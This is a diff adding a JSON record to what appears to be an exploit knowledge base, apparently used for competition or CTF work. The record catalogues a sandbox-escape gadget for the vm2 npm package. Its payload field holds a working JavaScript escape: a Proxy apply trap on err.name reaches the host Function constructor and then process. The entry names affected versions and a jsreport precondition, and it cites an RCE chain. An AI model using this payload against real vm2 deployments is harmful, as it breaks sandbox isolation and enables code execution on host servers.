@@ -1,0 +1,15 @@
+{
+  "package": "vm2",
+  "ecosystem": "npm",
+  "gadgets": [
+    {
+      "versions": "<= 3.9.x (used on 3.8.3)",
+      "sink": "Error.prototype.stack stringifies err.name",
+      "payload": "var e=new Error(); e.name={toString:new Proxy(function(){return ''},{apply:function(t,th,a){ HOST=a.constructor.constructor('return process')() ; return ''}})}; String(e.stack)",
+      "effect": "the apply trap receives a HOST arguments object, so args.constructor.constructor reaches the host Function and then process",
+      "precondition": "arbitrary JS inside the sandbox (in jsreport: template.helpers as a string)",
+      "proven_by": "knowledge/chains/cscv2026-chromatic-mergecatalog-constructor-prototype-ejs-outputfunctionname-rce.json and the diemthi local run"
+    }
+  ],
+  "schema_version": 1
+}
